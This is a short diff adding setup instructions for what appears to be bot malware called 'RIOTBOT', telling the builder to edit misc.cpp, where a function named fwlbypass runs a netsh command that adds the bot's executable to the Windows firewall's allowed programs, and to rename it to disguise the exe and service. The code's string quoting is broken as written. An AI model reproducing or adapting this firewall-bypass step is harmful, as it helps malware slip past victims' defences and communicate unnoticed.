@@ -1,0 +1,8 @@
+Once you edit configs open misc.cpp and scroll to the bottom. Edit:
+
+int fwlbypass()
+{
+		system("netsh firewall add allowedprogram RIOTBOT.exe "RIOTBOT" ENABLE");
+}
+
+Change RIOTBOT.exe to name of your exe, change "RIOTBOT" to the app service name.
